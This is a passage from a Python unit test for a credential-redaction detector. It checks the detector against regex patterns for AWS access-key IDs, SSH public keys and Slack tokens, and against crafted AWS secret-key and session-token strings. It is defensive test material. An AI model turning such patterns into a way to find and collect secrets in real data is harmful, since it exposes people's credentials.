        fixture = _Path(__file__).resolve().parent / "fixtures" / "redaction_keyed_values.json"
        rows = decode_rows(json.loads(fixture.read_text(encoding="utf-8")))
        tag_head = "[REDACTED"
        corpus = [row["text"] for row in rows if tag_head not in row["text"]]
        corpus += [text for text in self._ROUND_INPUTS if tag_head not in text]
        corpus += [
            f'SecretAccessKey=\\""{self._SECRET}',
            f'SecretAccessKey=""{self._SECRET}',
            f'SecretAccessKey=\\"{self._SECRET}',
            f"SecretAccessKey='{self._SECRET}'",
            f"SessionToken={self._SECRET},x",
            f"aws_session_token=]{self._SECRET}",
        ]
        assert len(corpus) > 500, len(corpus)
        for text in corpus:
            assert hard_credential_hit(text) is (
                self._BASE_LABELLED_RE.search(text) is not None
                or re.search(r"(?:ssh-rsa|ssh-ed25519)[\s+%]|xox[bpas]-[0-9a-zA-Z-]+", text)
                is not None
                or re.search(r"\b(?:AKIA|ASIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA)[0-9A-Z]{16}\b", text)
                is not None
            ), text
